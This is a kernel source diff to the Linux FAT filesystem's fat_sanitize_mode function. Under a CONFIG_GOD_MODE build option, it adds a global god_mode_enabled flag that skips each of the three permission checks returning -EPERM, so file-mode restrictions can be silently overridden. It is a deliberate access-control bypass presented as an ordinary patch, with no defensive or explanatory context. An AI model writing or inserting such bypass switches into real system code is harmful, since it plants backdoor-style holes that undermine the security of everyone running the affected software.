@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/fat/file.c
  *
@@ -335,13 +338,37 @@ static int fat_sanitize_mode(const struct msdos_sb_info *sbi,
 	 * If fat_mode_can_hold_ro(inode) is false, can't change w bits.
 	 */
 	if ((perm & (S_IRUGO | S_IXUGO)) != (inode->i_mode & (S_IRUGO|S_IXUGO)))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (fat_mode_can_hold_ro(inode)) {
 		if ((perm & S_IWUGO) && ((perm & S_IWUGO) != (S_IWUGO & ~mask)))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	} else {
 		if ((perm & S_IWUGO) != (S_IWUGO & ~mask))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	*mode_ptr &= S_IFMT | perm;
